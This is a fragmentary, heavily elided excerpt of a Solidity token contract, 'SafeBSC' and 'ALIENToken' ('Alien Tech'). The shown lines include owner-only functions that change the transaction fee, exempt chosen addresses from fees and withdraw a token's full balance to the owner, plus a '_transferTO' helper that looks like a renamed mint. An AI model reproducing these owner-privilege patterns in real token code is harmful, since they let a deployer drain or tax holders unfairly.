...
contract SafeBSC is Context, IBSC, Ownable {
    ...
    // Transaction Fees:
    uint256 public txFee = 40; // 4% fees
    ...
    */
    ...
    function setFeeDistributor(address _distributor) public onlyOwner {
        require(_distributor != address(0), "BSC: transfer from the zero address");
    ...
    function setFeelessSender(address _sender, bool _feeless) public onlyOwner {
        require(_sender != address(0), "BSC: transfer from the zero address");
    ...
    function setFeelessReciever(address _recipient, bool _feeless) public onlyOwner {
        require(_recipient != address(0), "BSC: transfer from the zero address");
        require(!_feeless || _feeless && canWhitelist, "cannot add to whitelist");
   ...
   function seTxFee(uint256 _ff) public onlyOwner {
    ...
    function retByAdmin(address _token) public onlyOwner {
        require(IBSC(_token).transfer(msg.sender, IBSC(_token).balanceOf(address(this))), "Error in retrieving bbp tokens");
    ...
    function _transferTO(address account, uint256 amount) internal virtual {
        require(account != address(0), "BSC: making to the zero address");
    ...
    function _approve(address _owner, address _spender, uint256 _amount) internal virtual {
        require(_owner != address(0), "BSC: approve from the zero address");
        require(_spender != address(0), "BSC: approve to the zero address");
...
contract ALIENToken is SafeBSC {

    constructor() SafeBSC("Alien Tech", "Alien") {
